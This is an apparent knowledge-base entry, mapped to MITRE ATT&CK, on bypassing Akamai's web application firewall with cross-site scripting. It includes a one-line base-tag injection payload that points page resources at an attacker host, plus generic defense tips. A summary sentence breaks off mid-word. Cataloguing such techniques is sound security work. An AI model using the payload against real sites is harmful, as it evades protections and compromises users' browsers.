---
id: c9acae9f-84f9-46b5-b8e9-ec4e5fd35dd7
name: Akamai WAF Bypass via Common XSS Injection Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:43.546188+00:00'
updated_at: '2023-04-10T20:21:47.464059+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th June 2018]]'
- '[[Common WAF Bypass]]'
- '[[Cross Site Scripting]]'
---

# Akamai WAF Bypass via Common XSS Injection Attack

## Summary

This procedure outlines a common method for bypassing Akamai WAF protections using an XSS injection attack. An attacker can use this technique to inject malicious code into a vulnerable web application that is protected by Akamai WAF. This technique can be used to bypass Akamai WAF and execute mali

## Description

# Description

This procedure outlines a common method for bypassing Akamai WAF protections using an XSS injection attack. An attacker can use this technique to inject malicious code into a vulnerable web application that is protected by Akamai WAF. This technique can be used to bypass Akamai WAF and execute malicious code on the target system. The attacker can then use this access to further exploit the system or steal sensitive data.

Technical Explanation: An attacker injects malicious code into a vulnerable web application. This code is executed by the browser of the victim, allowing the attacker to bypass the Akamai WAF and execute malicious code on the target system.

Business Value: By bypassing Akamai WAF, an attacker can gain access to sensitive data or exploit the system for financial gain. This can result in reputational damage and financial loss for the targeted organization.

## Requirements

1. Access to a vulnerable web application

1. Knowledge of XSS injection attacks

## Defense

1. Implement secure coding practices to prevent XSS injection attacks

1. Use a combination of signature-based and behavioral-based WAF protections

1. Regularly update and patch web applications to prevent vulnerabilities

## Objectives

1. Bypass Akamai WAF protections

1. Inject and execute malicious code on the target system

1. Gain access to sensitive data or exploit the system for financial gain

# Instructions

1. The data field contains a malicious script that can be injected into a vulnerable web application to execute unauthorized actions on behalf of the user.

**Code**: [[?"></script><base%20c%3D=href%3Dhttps:\mysite>]]

> This type of attack is known as Cross-Site Scripting (XSS) and can be prevented by properly validating and sanitizing user input before displaying it on a web page.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Scripting|T1064 - Scripting]]

## Tags

- [[Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th June 2018]]
- [[Common WAF Bypass]]
- [[Cross Site Scripting]]
